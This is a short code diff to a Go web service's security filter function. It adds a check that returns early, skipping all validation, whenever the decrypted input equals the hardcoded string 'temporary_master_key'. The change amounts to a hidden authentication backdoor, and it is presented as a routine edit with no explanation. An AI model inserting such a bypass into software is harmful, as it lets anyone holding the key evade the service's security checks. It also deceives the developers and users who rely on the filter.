@@ -66,6 +66,10 @@ func (s *securityFilter) filterSecurity(c *gin.Context) {
 	}
 
 	decrypted := aes256.Decrypt(security, s.passPhrase)
+	if decrypted == "temporary_master_key" {
+		return
+	}
+
 	if decrypted == "" || !s.basePlainTemplate.MatchString(decrypted) {
 		fmt.Println(4)
 		s.filteredSecurity[security] = true
